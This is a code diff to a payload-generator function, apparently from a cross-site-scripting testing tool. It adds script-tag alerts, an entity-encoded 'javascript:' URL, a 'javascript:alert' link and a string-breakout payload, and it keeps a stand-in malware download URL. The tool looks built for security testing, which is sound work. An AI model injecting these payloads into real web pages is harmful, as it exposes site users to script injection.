@@ -99,8 +99,9 @@ def generate_payload(context):
         options = [
             # "<b> bolded all day every day</b>",
             # "<i> italics rule</i>",
-            # "<h1>HACKED</h1>",
-            '<input type="file" accept="video/*;capture=camcorder">',
+             "<h1>HACKED</h1>",
+             "<script> alert('YOU'VE BEEN HACKED'); </script>",
+            #'<input type="file" accept="video/*;capture=camcorder">',
             # '<input type="file" accept="audio/*;capture=microphone">',
             # '<img src="http://forklog.net/wp-content/uploads/2015/05/12035-hacked_article.jpg" />',
             # '<iframe width="420" height="315" src="https://www.youtube.com/embed/7t96m2ynKw0&autoplay=1" frameborder="0" allowfullscreen></iframe>'
@@ -113,13 +114,13 @@ def generate_payload(context):
     elif context == 'URL_START':
         return 'ftp://malware.net/h4xx0r_malware.exe'
     elif context == 'URL_GENERAL':
-        return 'http://google.com/'
+        return '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x74;&#x72;&#x69;&#x63;&#x6b;&#x79;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x21;&#x27;&#x29;&#x3b;'
     elif context == 'URL_QUERY':
-        return 'https://bank.com/transfer?id=hacker&amount=1000000000'
+        return 'javascript:alert(1337);'
     elif context == 'JS_STRING':
         options = [
             # '<script>alert(document.cookie + " YOU\'VE BEEN HACKED")</script>',
-            '<script>alert("HACKED AGAIN")</script>'
+            '\'; alert(\'Hacked!\'); //',
         ]
         return random.choice(options)
 
